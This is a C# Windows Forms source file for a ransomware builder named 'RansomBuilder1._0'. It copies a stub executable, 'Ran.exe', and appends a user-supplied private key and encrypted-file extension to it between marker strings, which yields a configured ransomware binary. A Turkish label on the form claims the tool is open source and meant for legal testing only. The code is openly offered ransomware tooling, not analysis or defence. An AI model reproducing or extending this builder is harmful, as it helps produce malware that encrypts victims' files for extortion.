using System;
using System.Linq;

namespace RansomBuilder1._0
{
    public partial class Form1 : System.Windows.Forms.Form
    {
        public Form1()
        {
            InitializeComponent();
            this.Load += Form1_Load;
        }

        private void Form1_Load(object sender , EventArgs e)
        {
            
            label1.Text = "Bu program açık kaynaklıdır. Programı obfuscate etmeden , açık kaynaklı yazısını kaldırmadan kullanabilirsiniz \n ve değiştirebilirsiniz. Bu program yasal işler için ve deneme amaçlı kullanılabilir , kötü amaçla kullanılamaz. Bunu \n kullanan herkes bu anlaşmayı kabul eder. Tüm sorumluluk kullanıcıya aittir.";
            bunifuFlatButton1.Text = "Oluştur";
            bunifuTextbox1.text = "";
            bunifuTextbox2.text = "";
            bunifuTextbox3.text = "";
            label2.Text = "Private Key";
            label3.Text = "Uzantı";
            label4.Text = "İsim";
        }

        private void bunifuImageButton2_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Application.Exit();
        }

        private void imageAnimation_Click(object sender, EventArgs e) 
        {
            if (panel1.Width == 248) 
                panel1.Width = 56;      
            else            
                panel1.Width = 248;         
        }

        private void bunifuFlatButton1_Click(object sender, EventArgs e)
        {
            if (bunifuTextbox1.text == "" || bunifuTextbox2.text == "")
                System.Windows.Forms.MessageBox.Show("Bir şeyleri yanlış yapıyorsun","");
            else
            {
                if (!bunifuTextbox3.text.Contains(".exe"))
                    bunifuTextbox3.text += ".exe";

                if (!bunifuTextbox2.text.Contains("."))
                    bunifuTextbox2.text = "." + bunifuTextbox2.text;


                System.IO.File.Copy(Environment.CurrentDirectory + "/Ran.exe",Environment.CurrentDirectory+"/"+bunifuTextbox3.text);
                System.IO.BinaryWriter bw = new System.IO.BinaryWriter(new System.IO.FileStream(Environment.CurrentDirectory + "/"+bunifuTextbox3.text,System.IO.FileMode.Append));
                bw.Write("-STARTKEY-"+bunifuTextbox1.text+"-ENDKEY-");
                bw.Write("-STARTEXTENSION-"+bunifuTextbox2.text+"-ENDEXTENSION-");
                bw.Flush();
                bw.Close();

            }

        }
    }
}
